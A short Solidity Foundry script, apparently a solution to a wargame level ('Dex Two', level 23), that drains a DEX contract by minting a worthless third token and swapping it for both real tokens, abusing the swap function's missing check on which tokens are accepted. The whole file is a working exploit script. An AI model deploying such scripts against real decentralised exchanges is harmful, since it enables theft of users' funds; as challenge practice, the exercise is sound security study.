// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level23.sol";

contract AttackerScript is Script {
    DexTwo public dex = DexTwo(0xbED0B8F2Fdc5c2dA6C769C264B01D403Bfccb9e7);
    address tk1 = dex.token1();
    address tk2 = dex.token2();
    address tk3;
    SwappableTokenTwo public token1 = SwappableTokenTwo(tk1);
    SwappableTokenTwo public token2 = SwappableTokenTwo(tk2);
    SwappableTokenTwo public token3;

    address bob = 0x6bB635a27447c6bDDE8935557fe73E34AaF76Eea; // exploiter address here



    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      dex.approve(address(dex), 100000);
      token3 = new SwappableTokenTwo(address(dex), "Token3", "TK3", 10000);

      tk3 = address(token3);
      token3.transfer(address(dex), 100);
      token3.approve(bob, address(dex), 10000);

      dex.swap(tk3, tk1, 100);
      dex.swap(tk3, tk2, 200);

      vm.stopBroadcast();
    }
}
